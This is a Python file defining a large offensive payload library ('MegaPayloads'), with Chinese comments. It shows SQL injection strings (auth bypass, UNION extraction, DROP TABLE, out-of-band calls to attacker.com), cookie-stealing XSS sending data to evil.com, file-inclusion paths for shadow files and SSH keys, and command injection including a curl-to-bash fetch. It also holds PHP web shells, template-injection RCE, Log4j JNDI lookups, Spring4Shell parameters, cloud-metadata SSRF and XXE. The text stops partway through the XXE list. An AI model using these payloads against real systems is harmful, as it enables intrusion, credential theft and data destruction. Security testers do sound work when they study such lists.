#!/usr/bin/env python3
"""
超级Payload库 - 1500+ Payloads
包含: SQLi, XSS, LFI/RFI, RCE, SSRF, XXE, SSTI, Deserialization等
"""

class MegaPayloads:
    """超级Payload库"""
    
    # ==================== SQL注入 (300+) ====================
    SQLI = {
        "mysql": {
            "auth_bypass": [
                "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'#", "' OR '1'='1'/*",
                "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*", "') OR '1'='1", "') OR ('1'='1",
                "admin'--", "admin'#", "admin'/*", "admin' OR '1'='1", "admin' OR '1'='1'--",
                "admin') OR ('1'='1'--", "') OR '1'='1'--", "' OR ''='", "' OR 'x'='x",
                "' OR 1--", "' OR 1#", "or 1=1", "or 1=1--", "' or ''-'", "' or '' '",
                "' or ''&'", "' or ''^'", "' or ''*'", "or true--", "') or true--",
                "admin' or 1=1--", "admin' or '1'='1'--", "1' or '1'='1", "1 or 1=1",
                "' OR 'a'='a", "') OR ('a'='a", "') OR ('a'='a'--", "' OR 'a'='a'--",
                "' OR 'a'='a'#", "' OR 1 LIKE 1", "' OR 1=1 LIMIT 1--", "1' OR '1'='1'/*",
            ],
            "union_select": [
                "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT NULL,NULL,NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
                "' UNION SELECT 1--", "' UNION SELECT 1,2--", "' UNION SELECT 1,2,3--",
                "' UNION SELECT 1,2,3,4--", "' UNION SELECT 1,2,3,4,5--",
                "' UNION SELECT 1,2,3,4,5,6--", "' UNION SELECT 1,2,3,4,5,6,7--",
                "' UNION SELECT 1,2,3,4,5,6,7,8--", "' UNION SELECT 1,2,3,4,5,6,7,8,9--",
                "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
                "' UNION ALL SELECT NULL--", "' UNION ALL SELECT NULL,NULL--",
                "' UNION ALL SELECT 1,2,3--", "' UNION ALL SELECT 1,2,3,4,5--",
                "-1' UNION SELECT 1,2,3--", "0' UNION SELECT 1,2,3--",
                "1' UNION SELECT 1,2,3--", "99999' UNION SELECT 1,2,3--",
                "' UNION SELECT @@version--", "' UNION SELECT user()--",
                "' UNION SELECT database()--", "' UNION SELECT schema_name FROM information_schema.schemata--",
                "' UNION SELECT table_name FROM information_schema.tables--",
                "' UNION SELECT column_name FROM information_schema.columns--",
                "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--",
                "' UNION SELECT CONCAT(username,0x3a,password) FROM users--",
                "' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables--",
                "' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'--",
                "' UNION SELECT LOAD_FILE('/etc/passwd')--",
            ],
            "error_based": [
                "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--",
                "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--",
                "' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))a)--",
                "' AND exp(~(SELECT * FROM (SELECT database())a))--",
                "' AND GTID_SUBSET(CONCAT(0x7e,(SELECT database())),1)--",
                "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,database())) USING utf8)))--",
                "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--",
                "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1)--",
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user())))--",
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 0,1)))--",
                "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            ],
            "time_based": [
                "' AND SLEEP(5)--", "' AND SLEEP(5)#", "'; SELECT SLEEP(5)--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "' AND IF(1=1,SLEEP(5),0)--",
                "' AND IF(1=2,SLEEP(5),0)--", "' OR SLEEP(5)--", "' OR SLEEP(5)#",
                "1' AND BENCHMARK(5000000,SHA1('test'))--",
                "' AND (SELECT SLEEP(5) FROM DUAL WHERE 1=1)--",
                "' AND SLEEP(5) AND '1'='1", "') AND SLEEP(5) AND ('1'='1",
                "1' AND SLEEP(5) AND '1'='1", "1') AND SLEEP(5) AND ('1'='1",
                "' OR IF(1=1,SLEEP(5),0)--", "' AND IF(1=1,BENCHMARK(5000000,MD5('a')),0)--",
                "' RLIKE SLEEP(5)--", "' OR 1=1 AND SLEEP(5)--",
                "';WAITFOR DELAY '0:0:5'--", "');WAITFOR DELAY '0:0:5'--",
            ],
            "stacked": [
                "'; DROP TABLE users--", "'; INSERT INTO users VALUES('hack','hack')--",
                "'; UPDATE users SET password='hacked' WHERE username='admin'--",
                "'; DELETE FROM users--", "'; CREATE TABLE hack(data varchar(100))--",
                "'; SELECT * INTO OUTFILE '/tmp/test.txt'--",
                "'; SELECT * INTO DUMPFILE '/tmp/shell.php'--",
            ],
            "waf_bypass": [
                "' /*!50000OR*/ '1'='1", "' %00OR '1'='1", "' OR/**/1=1--",
                "' UN/**/ION SE/**/LECT 1,2,3--", "' UNION%0ASELECT%0A1,2,3--",
                "' /*!UNION*/ /*!SELECT*/ 1,2,3--", "'+OR+1=1--", "'%20OR%201=1--",
                "' /*!12345UNION*/ /*!12345SELECT*/ 1,2,3--", "' oR '1'='1",
                "' Or '1'='1", "' OR%0A1=1--", "' OR%0D%0A1=1--", "' OR%091=1--",
                "1'%20or%20'1'='1", "1'%0Aor%0A'1'='1", "1'/**/or/**/'1'='1",
                "' UniOn SeLeCt 1,2,3--", "' uNiOn sElEcT 1,2,3--",
                "' %55nion %53elect 1,2,3--", "' u]nion [se]lect 1,2,3--",
                "' /*!50000%55nion*/ /*!50000%53elect*/ 1,2,3--",
                "'||'1", "'## || '1", "'='1", "'+OR+'1", "'OR+'1",
                "' AND 1=1 UNION SELECT 1,2,3--", "' AND 0 UNION SELECT 1,2,3--",
                "' AnD '1'='1", "' aNd '1'='1", "'%20AND%20'1'='1",
                "'-1' UNION SELECT 1,2,3--", "'%2d1' UNION SELECT 1,2,3--",
                "' having 1=1--", "' group by 1--", "' order by 1--",
                "' %26%26 1=1--", "' && 1=1--",
            ],
            "out_of_band": [
                "' AND LOAD_FILE(CONCAT('\\\\\\\\',database(),'.attacker.com\\\\a'))--",
                "' AND (SELECT * FROM (SELECT CONCAT('\\\\\\\\',database(),'.attacker.com\\\\a'))a)--",
            ]
        },
        "mssql": {
            "auth_bypass": [
                "' OR '1'='1", "' OR '1'='1'--", "') OR '1'='1'--", "admin'--",
                "' OR 1=1--", "' OR 1=1 /*", "') OR ('1'='1", "' OR 'a'='a",
            ],
            "union_select": [
                "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT @@version--",
                "' UNION SELECT name FROM master..sysdatabases--",
                "' UNION SELECT name FROM sysobjects WHERE xtype='U'--",
                "' UNION SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--",
            ],
            "error_based": [
                "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
                "' AND 1=CONVERT(int,(SELECT @@version))--",
                "' AND 1=CONVERT(int,db_name())--",
            ],
            "time_based": [
                "'; WAITFOR DELAY '0:0:5'--", "'); WAITFOR DELAY '0:0:5'--",
                "'; IF 1=1 WAITFOR DELAY '0:0:5'--", "'; IF 1=2 WAITFOR DELAY '0:0:5'--",
            ],
            "stacked": [
                "'; EXEC xp_cmdshell('whoami')--", "'; EXEC sp_configure 'show advanced options',1--",
                "'; EXEC sp_configure 'xp_cmdshell',1--", "'; RECONFIGURE--",
                "'; EXEC master..xp_cmdshell 'ping attacker.com'--",
            ]
        },
        "postgresql": {
            "auth_bypass": ["' OR '1'='1", "' OR '1'='1'--", "' OR 1=1--"],
            "union_select": [
                "' UNION SELECT NULL--", "' UNION SELECT version()--",
                "' UNION SELECT current_database()--", "' UNION SELECT current_user--",
                "' UNION SELECT table_name FROM information_schema.tables--",
            ],
            "time_based": [
                "'; SELECT pg_sleep(5)--", "' AND pg_sleep(5)--",
                "' OR pg_sleep(5)--", "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
            ],
            "stacked": [
                "'; CREATE TABLE hack(data text)--",
                "'; COPY hack FROM '/etc/passwd'--",
                "'; DROP TABLE hack--",
            ]
        },
        "oracle": {
            "auth_bypass": ["' OR '1'='1", "' OR 1=1--", "') OR ('1'='1"],
            "union_select": [
                "' UNION SELECT NULL FROM DUAL--", "' UNION SELECT banner FROM v$version--",
                "' UNION SELECT user FROM dual--", "' UNION SELECT table_name FROM all_tables--",
            ],
            "time_based": [
                "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
                "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
            ],
            "out_of_band": [
                "' AND UTL_HTTP.REQUEST('http://attacker.com/'||user)--",
                "' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--",
            ]
        },
        "sqlite": {
            "auth_bypass": ["' OR '1'='1", "' OR 1=1--", "' OR 1--"],
            "union_select": [
                "' UNION SELECT NULL--", "' UNION SELECT sqlite_version()--",
                "' UNION SELECT name FROM sqlite_master--",
                "' UNION SELECT sql FROM sqlite_master--",
            ]
        }
    }
    
    # ==================== XSS (200+) ====================
    XSS = {
        "basic": [
            "<script>alert('XSS')</script>", "<script>alert(1)</script>",
            "<script>alert(document.cookie)</script>", "<script>alert(document.domain)</script>",
            "<script>prompt('XSS')</script>", "<script>confirm('XSS')</script>",
            "<script>eval('alert(1)')</script>", "<script>setTimeout('alert(1)',0)</script>",
            "<script>setInterval('alert(1)',1000)</script>",
            "<script src=//evil.com/xss.js></script>",
            "<script>new Image().src='http://evil.com/?c='+document.cookie</script>",
            "<img src=x onerror=alert('XSS')>", "<img src=x onerror=alert(1)>",
            "<img/src=x onerror=alert(1)>", "<img src=x onerror=alert(document.cookie)>",
            "<svg onload=alert('XSS')>", "<svg/onload=alert(1)>",
            "<svg onload=alert(1)//", "<body onload=alert('XSS')>",
            "<body onpageshow=alert(1)>", "<input onfocus=alert('XSS') autofocus>",
            "<input onblur=alert('XSS') autofocus autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>", "<keygen onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>", "<marquee onstart=alert('XSS')>",
            "<video><source onerror=alert('XSS')>", "<video src=x onerror=alert(1)>",
            "<audio src=x onerror=alert('XSS')>", "<iframe src=\"javascript:alert('XSS')\">",
            "<iframe srcdoc=\"<script>alert(1)</script>\">",
            "<object data=\"javascript:alert('XSS')\">",
            "<embed src=\"javascript:alert('XSS')\">", "<a href=\"javascript:alert('XSS')\">click</a>",
            "<a href=javascript:alert(1)>click</a>", "<form action=\"javascript:alert('XSS')\"><input type=submit>",
            "<div onmouseover=alert('XSS')>hover</div>", "<div onmouseenter=alert(1)>hover</div>",
            "<details open ontoggle=alert('XSS')>", "<details ontoggle=alert(1) open>",
            "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
        ],
        "event_handlers": [
            "<img src=x onload=alert(1)>", "<body onscroll=alert(1)><br><br>...<br><input autofocus>",
            "<input type=image src=x onerror=alert(1)>", "<isindex action=javascript:alert(1) type=image>",
            "<form><button formaction=javascript:alert(1)>click", "<form><input type=submit formaction=javascript:alert(1)>",
            "<form><input type=image formaction=javascript:alert(1)>",
            "<video poster=javascript:alert(1)//></video>",
            "<object data=javascript:alert(1)>", "<embed code=javascript:alert(1)>",
            "<bgsound src=javascript:alert(1)>", "<link rel=import href=data:text/html,<script>alert(1)</script>",
            "<base href=javascript:alert(1)//",
        ],
        "encoded": [
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",
            "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
            "%253Cscript%253Ealert('XSS')%253C/script%253E",
            "<script>eval(atob('YWxlcnQoMSk='))</script>",
            "<script>eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29')</script>",
            "<script>eval('\\141\\154\\145\\162\\164\\050\\061\\051')</script>",
            "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
            "<svg onload=eval(atob('YWxlcnQoMSk='))>",
            "<img src=x onerror=eval('\\x61lert(1)')>",
        ],
        "waf_bypass": [
            "<ScRiPt>alert('XSS')</ScRiPt>", "<SCRIPT>alert('XSS')</SCRIPT>",
            "<script >alert('XSS')</script >", "<script\t>alert('XSS')</script\t>",
            "<script\n>alert('XSS')</script\n>", "<script\r>alert('XSS')</script\r>",
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            "<<script>alert('XSS')//<</script>", "<img src=`x`onerror=alert('XSS')>",
            "<img/src=x/onerror=alert('XSS')>", "<img\tsrc=x\tonerror=alert('XSS')>",
            "<img\nsrc=x\nonerror=alert('XSS')>", "<svg/onload=alert('XSS')>",
            "<body/onload=alert('XSS')>", "'-alert('XSS')-'", "\"-alert('XSS')-\"",
            "javascript:alert('XSS')", "data:text/html,<script>alert('XSS')</script>",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            "<img src=x:alert(alt) onerror=eval(src) alt='XSS'>",
            "<svg><script>alert&#40;1&#41;</script></svg>",
            "<svg><script>alert&lpar;1&rpar;</script></svg>",
            "<a href=ja&#x0A;vascript:alert(1)>click</a>",
            "<a href=j&#97;v&#97;script:alert(1)>click</a>",
            "<img src=1 onerror=\u0061lert(1)>",
            "<img src=1 onerror=\\u0061lert(1)>",
            "1<ScRiPt>alert(1)</sCriPt>1", "1<ScRiPt >alert(1)</sCriPt >",
        ],
        "dom_based": [
            "#<script>alert('XSS')</script>", "javascript:alert('XSS')//",
            "'-alert(1)-'", "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>", "\"onmouseover=\"alert('XSS')\"",
            "'onmouseover='alert(\"XSS\")'", "\" onclick=alert(1)//",
            "' onclick=alert(1)//", "\"><img src=x onerror=alert(1)>",
            "'><img src=x onerror=alert(1)>", "\" onfocus=alert(1) autofocus x=\"",
            "' onfocus=alert(1) autofocus x='", "\"autofocus onfocus=alert(1) x=\"",
        ],
        "polyglot": [
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
            "'\"><img src=x onerror=alert(1)//",
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
            "-->'\"onclick=alert(1)//\"><img/src=x onerror=alert``>",
            "{{constructor.constructor('alert(1)')()}}",
            "<svg/onload=alert(1)>", "'\"><svg/onload=alert(String.fromCharCode(88,83,83))>",
        ],
        "csp_bypass": [
            "<script src=\"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js\"></script><div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>",
            "<script src=https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js></script><div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>",
            "<base href=\"https://evil.com/\"><script src=\"/xss.js\"></script>",
            "<meta http-equiv=\"refresh\" content=\"0; url=javascript:alert(1)\">",
        ]
    }
    
    # ==================== LFI/RFI (150+) ====================
    LFI = {
        "linux": [
            "../../../etc/passwd", "....//....//....//etc/passwd",
            "../../../../../../../etc/passwd", "../../../../../../../../etc/passwd",
            "../../../../../../../../../etc/passwd", "../../../../../../../../../../etc/passwd",
            "/etc/passwd", "file:///etc/passwd", "/etc/passwd%00",
            "/etc/shadow", "/etc/group", "/etc/hosts", "/etc/hostname",
            "/etc/resolv.conf", "/etc/crontab", "/etc/ssh/sshd_config",
            "/etc/apache2/apache2.conf", "/etc/apache2/sites-enabled/000-default.conf",
            "/etc/nginx/nginx.conf", "/etc/nginx/sites-enabled/default",
            "/etc/mysql/my.cnf", "/etc/php/7.4/apache2/php.ini",
            "/proc/self/environ", "/proc/self/cmdline", "/proc/self/fd/0",
            "/proc/self/fd/1", "/proc/self/fd/2", "/proc/self/status",
            "/proc/self/maps", "/proc/self/mounts", "/proc/version",
            "/var/log/apache2/access.log", "/var/log/apache2/error.log",
            "/var/log/nginx/access.log", "/var/log/nginx/error.log",
            "/var/log/auth.log", "/var/log/syslog", "/var/log/mail.log",
            "/var/log/httpd/access_log", "/var/log/httpd/error_log",
            "/var/www/html/index.php", "/var/www/html/config.php",
            "/home/user/.bash_history", "/home/user/.ssh/id_rsa",
            "/root/.bash_history", "/root/.ssh/id_rsa",
            "....//....//....//....//etc/passwd", "..\\..\\..\\..\\etc\\passwd",
            "....\\/....\\/....\\/etc/passwd", "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
        ],
        "windows": [
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....\\....\\....\\windows\\system32\\drivers\\etc\\hosts",
            "C:\\Windows\\System32\\drivers\\etc\\hosts", "C:\\Windows\\win.ini",
            "C:\\boot.ini", "C:\\inetpub\\wwwroot\\web.config",
            "C:\\inetpub\\logs\\LogFiles\\W3SVC1\\ex*.log",
            "C:\\Windows\\System32\\config\\SAM", "C:\\Windows\\System32\\config\\SYSTEM",
            "C:\\Windows\\System32\\config\\SECURITY",
            "C:\\Windows\\repair\\SAM", "C:\\Windows\\repair\\system",
            "C:\\Windows\\debug\\NetSetup.log", "C:\\Windows\\Panther\\Unattend.xml",
            "C:\\Windows\\Panther\\Unattended.xml",
            "C:\\xampp\\apache\\conf\\httpd.conf", "C:\\xampp\\mysql\\bin\\my.ini",
            "C:\\xampp\\phpMyAdmin\\config.inc.php", "C:\\wamp\\www\\",
            "..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
            "....\\\\....\\\\....\\\\Windows\\\\win.ini",
        ],
        "encoded": [
            "..%2f..%2f..%2fetc%2fpasswd", "..%252f..%252f..%252fetc%252fpasswd",
            "%2e%2e/%2e%2e/%2e%2e/etc/passwd", "....%2f....%2f....%2fetc%2fpasswd",
            "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
            "..%c0%af..%c0%af..%c0%afetc/passwd", "..%25c0%25af..%25c0%25afetc/passwd",
            "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            "..%255c..%255c..%255cetc/passwd", "%2e%2e%5c%2e%2e%5cetc%5cpasswd",
            "..%00/etc/passwd", "..%0d/etc/passwd", "..%0a/etc/passwd",
            "..%09/etc/passwd", "..%20/etc/passwd",
        ],
        "php_wrapper": [
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/read=string.rot13/resource=index.php",
            "php://filter/read=convert.base64-encode/resource=../config.php",
            "php://filter/convert.base64-encode/resource=../../../etc/passwd",
            "php://input", "php://fd/0", "php://fd/1", "php://memory", "php://temp",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
            "data://text/plain,<?php system($_GET['cmd']);?>",
            "expect://id", "expect://whoami", "phar://./test.phar/test.txt",
            "php://filter/read=convert.base64-encode/resource=php://input",
            "php://filter/zlib.deflate/convert.base64-encode/resource=index.php",
            "php://filter/convert.iconv.utf-8.utf-16/resource=index.php",
        ],
        "null_byte": [
            "../../../etc/passwd%00", "../../../etc/passwd\x00",
            "../../../etc/passwd%00.jpg", "../../../etc/passwd\x00.png",
            "../../../etc/passwd%00.html", "../../../etc/passwd%00.txt",
            "....//....//etc/passwd%00.php", "..\\..\\etc\\passwd%00.asp",
        ],
        "double_encoding": [
            "%252e%252e%252fetc%252fpasswd", "%252e%252e/%252e%252e/etc/passwd",
            "..%252f..%252f..%252fetc/passwd", "%2e%2e%252f%2e%2e%252fetc/passwd",
        ]
    }
    
    # ==================== RCE (150+) ====================
    RCE = {
        "command_injection": [
            "; id", "| id", "|| id", "& id", "&& id", "`id`", "$(id)",
            "; whoami", "| whoami", "|| whoami", "& whoami", "&& whoami",
            "; cat /etc/passwd", "| cat /etc/passwd", "|| cat /etc/passwd",
            "& cat /etc/passwd", "&& cat /etc/passwd",
            "; ls -la", "| ls -la", "|| ls -la", "& ls -la", "&& ls -la",
            "; uname -a", "| uname -a", "& uname -a",
            "; sleep 5", "| sleep 5", "|| sleep 5", "& sleep 5", "&& sleep 5",
            "; ping -c 3 127.0.0.1", "| ping -c 3 127.0.0.1",
            "$IFS$9id", "${IFS}id", ";$IFS$9id", ";${IFS}id",
            "a]); system('id'); //", "a]); exec('id'); //",
            "\n id", "%0a id", "%0d%0a id", "%0Aid",
            "'$(id)'", "\"$(id)\"", "|`id`", ";`id`", "||`id`", "&&`id`",
            "1;id", "1|id", "1||id", "1&id", "1&&id",
            "`sleep 5`", "$(sleep 5)", "$(`sleep 5`)",
            ";{id,}", "|{id,}", "&{id,}",
            "; curl http://attacker.com", "| wget http://attacker.com",
            "; curl http://attacker.com | bash",
            "1;sleep${IFS}5", "1;sleep$IFS'5'",
        ],
        "php": [
            "<?php system($_GET['cmd']); ?>", "<?php passthru($_GET['cmd']); ?>",
            "<?php exec($_GET['cmd']); ?>", "<?php shell_exec($_GET['cmd']); ?>",
            "<?php eval($_POST['cmd']); ?>", "<?php popen($_GET['cmd'],'r'); ?>",
            "${<?php system($_GET['cmd']); ?>}", "<?=`$_GET[cmd]`?>",
            "<?php echo `$_GET['cmd']`; ?>", "<?php proc_open($_GET['cmd']); ?>",
            "<?php pcntl_exec($_GET['cmd']); ?>",
            "<?php file_put_contents('shell.php','<?php system($_GET[\"cmd\"]); ?>'); ?>",
            "<?php include($_GET['file']); ?>", "<?php require($_GET['file']); ?>",
            "<?php assert($_GET['cmd']); ?>", "<?php preg_replace('/a/e',$_GET['cmd'],'a'); ?>",
            "<?php create_function('','system($_GET[\"cmd\"]);')(); ?>",
            "<?php array_map('system',array($_GET['cmd'])); ?>",
            "<?php call_user_func('system',$_GET['cmd']); ?>",
        ],
        "template_injection": [
            "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "*{7*7}",
            "{{config}}", "{{config.items()}}", "{{self}}", "{{self.__class__}}",
            "{{self.__class__.__mro__}}", "{{self.__class__.__mro__[2].__subclasses__()}}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "${T(java.lang.System).getenv()}", "${7*7}",
            "#{T(java.lang.Runtime).getRuntime().exec('id')}",
            "__${T(java.lang.Runtime).getRuntime().exec('id')}__",
            "*{T(java.lang.Runtime).getRuntime().exec('id')}",
            "@(1+2)", "@(7*7)", "@System.Diagnostics.Process.Start('cmd','/c id')",
            "[[${7*7}]]", "[[(${7*7})]]",
            "{{constructor.constructor('return this')().process.mainModule.require('child_process').execSync('id')}}",
        ],
        "log4j": [
            "${jndi:ldap://attacker.com/a}", "${jndi:rmi://attacker.com/a}",
            "${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://attacker.com/a}",
            "${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com/a}",
            "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a}",
            "${${lower:j}ndi:${lower:l}dap://attacker.com/a}",
            "${${upper:j}ndi:${upper:l}dap://attacker.com/a}",
            "${j${::-n}di:ldap://attacker.com/a}",
            "${jn${::-d}i:ldap://attacker.com/a}",
            "${jndi:ldap://127.0.0.1#attacker.com:1389/a}",
            "${jndi:dns://attacker.com/a}", "${jndi:nis://attacker.com/a}",
            "${jndi:nds://attacker.com/a}", "${jndi:corba://attacker.com/a}",
            "${jndi:iiop://attacker.com/a}",
        ],
        "spring4shell": [
            "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di",
            "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp",
            "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT",
            "class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell",
            "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
        ]
    }
    
    # ==================== SSRF (100+) ====================
    SSRF = {
        "basic": [
            "http://127.0.0.1", "http://localhost", "http://127.0.0.1:80",
            "http://127.0.0.1:443", "http://127.0.0.1:22", "http://127.0.0.1:3306",
            "http://127.0.0.1:6379", "http://127.0.0.1:27017", "http://127.0.0.1:9200",
            "http://0.0.0.0", "http://0.0.0.0:80", "http://0",
            "http://[::1]", "http://[::1]:80", "http://[0000::1]",
            "http://localhost:80", "http://localhost:443", "http://localhost:22",
        ],
        "cloud_metadata": [
            # AWS
            "http://169.254.169.254/", "http://169.254.169.254/latest/",
            "http://169.254.169.254/latest/meta-data/", "http://169.254.169.254/latest/user-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/meta-data/ami-id",
            "http://169.254.169.254/latest/meta-data/hostname",
            "http://169.254.169.254/latest/dynamic/instance-identity/document",
            # GCP
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/",
            "http://metadata.google.internal/computeMetadata/v1/project/",
            "http://169.254.169.254/computeMetadata/v1/",
            # Azure
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "http://169.254.169.254/metadata/identity/oauth2/token",
            # DigitalOcean
            "http://169.254.169.254/metadata/v1/", "http://169.254.169.254/metadata/v1/id",
            # Alibaba
            "http://100.100.100.200/latest/meta-data/",
            # Oracle Cloud
            "http://169.254.169.254/opc/v1/instance/",
            # Kubernetes
            "https://kubernetes.default.svc/", "https://kubernetes.default/",
        ],
        "bypass": [
            "http://2130706433", "http://0x7f.0x0.0x0.0x1", "http://017700000001",
            "http://127.1", "http://127.0.1", "http://127.000.000.1",
            "http://0x7f000001", "http://0177.0.0.1", "http://0x7f.0.0.1",
            "http://2130706433", "http://3232235521", "http://3232235777",
            "http://0", "http://0.0.0.0:80", "http://localtest.me",
            "http://127.0.0.1.nip.io", "http://spoofed.burpcollaborator.net",
            "http://customer1.app.localhost.my.company.127.0.0.1.nip.io",
            "http://www.owasp.org.127.0.0.1.nip.io", "http://127。0。0。1",
            "http://127%E3%80%820%E3%80%820%E3%80%821", "http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ",
            "http://①②⑦.⓪.⓪.①", "http://127.0.0.1%00@evil.com",
            "http://evil.com@127.0.0.1", "http://127.0.0.1%23@evil.com",
            "http://127.0.0.1:80%23@evil.com", "http://127.0.0.1:80%2523@evil.com",
        ],
        "protocol": [
            "file:///etc/passwd", "file:///c:/windows/win.ini",
            "dict://127.0.0.1:6379/info", "dict://127.0.0.1:11211/stats",
            "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a",
            "gopher://127.0.0.1:25/_EHLO%20localhost",
            "ftp://127.0.0.1", "ftp://127.0.0.1:21", "sftp://127.0.0.1",
            "ldap://127.0.0.1", "ldap://127.0.0.1:389/%0astats%0aquit",
            "tftp://127.0.0.1:69/test", "jar:http://127.0.0.1!/",
            "netdoc:///etc/passwd", "phar://127.0.0.1/test.phar",
        ]
    }
    
    # ==================== XXE (50+) ====================
    XXE = {
        "basic": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/boot.ini">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
